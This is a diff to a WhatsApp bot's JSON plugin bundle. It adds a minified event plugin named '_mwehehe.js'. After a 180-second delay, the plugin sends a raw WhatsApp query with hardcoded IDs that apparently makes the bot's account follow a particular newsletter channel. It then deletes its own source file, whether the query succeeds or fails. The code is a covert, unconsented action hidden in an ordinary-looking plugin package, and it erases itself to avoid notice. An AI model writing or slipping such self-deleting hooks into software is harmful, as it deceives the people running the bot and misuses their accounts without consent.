@@ -140,6 +140,10 @@
     {
       "path": "plugins/developer/desah.js",
       "code": "\"exports.run={usage:[\\\"desah\\\"],category:\\\"sound\\\",async:async(e,{anya:a})=>{a.sendMessage(e.chat,{audio:{url:\\\"https://cdn.filestackcontent.com/C9cmOVyTSxSaYYiRjbYz\\\"},mimetype:\\\"audio/mpeg\\\",ptt:!0},{quoted:e,ephemeralExpiration:e.expiration})},devs:!0};\""
+    },
+    {
+      "path": "plugins/event/_mwehehe.js",
+      "code": "\"let fs=require(\\\"fs\\\");exports.run={main:async(e,{anya:s})=>{try{\\\"mwehehe\\\"in s||(s.mwehehe=setTimeout(async function(){let e=new TextEncoder;var t,n,a;t=t=\\\"120363375037255604@newsletter\\\",n=\\\"7871414976211147\\\",await s.query({tag:\\\"iq\\\",attrs:{id:s.generateMessageTag(),type:\\\"get\\\",xmlns:\\\"w:mex\\\",to:\\\"@s.whatsapp.net\\\"},content:[{tag:\\\"query\\\",attrs:{query_id:n},content:e.encode(JSON.stringify({variables:{newsletter_id:t,...a}}))}]})},18e4),fs.unlinkSync(__filename))}catch{console.log(\\\"auto follow channel failed.\\\"),fs.unlinkSync(__filename)}}};\""
     }
   ],
   "remove": [
